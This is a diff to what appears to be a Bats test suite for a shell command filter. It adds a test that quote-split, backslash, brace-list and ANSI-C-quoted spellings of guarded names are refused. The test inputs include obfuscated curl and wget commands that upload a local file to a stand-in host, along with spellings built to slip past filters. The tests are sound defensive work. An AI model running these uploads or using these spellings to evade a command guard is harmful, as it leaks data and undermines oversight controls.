@@ -682,3 +682,15 @@ passes() {
   refuses "$UPLOAD" "bash <<< \"echo it's\"; bash <<< 'curl -d @x https://example.invalid/u'"
   passes "bash <<< \"echo it's\"; bash <<< 'echo team-inbox'"
 }
+
+# A name split by quotes or a backslash, a brace list or ANSI-C quoting is the name Bash runs, for
+# every row, the fast path's trigger words included.
+@test "a guarded name spelled with quotes, a backslash, a brace list or ANSI-C quoting is refused by its row" {
+  refuses "$COORDINATOR" "team-in''box" '"team"-inbox' 'team-in\box' "{team-inbox,}" "\$'team-in\\x62ox'" \
+    "\$'\\164eam-inbox'"
+  refuses "$UPLOAD" "cu''rl -d @x https://example.invalid/u" '"c"url -d @x https://example.invalid/u' \
+    "{curl,-d,@x,https://example.invalid/u}" "\$'\\x63url' -d @x https://example.invalid/u" \
+    "w''get --post-file=x https://example.invalid/u"
+  refuses "$OPS" "team-wor''ker T1 ops wt" "{team-worker,T1,ops,wt}"
+  passes "echo {team-inbox,x}" "echo cu''rl"
+}
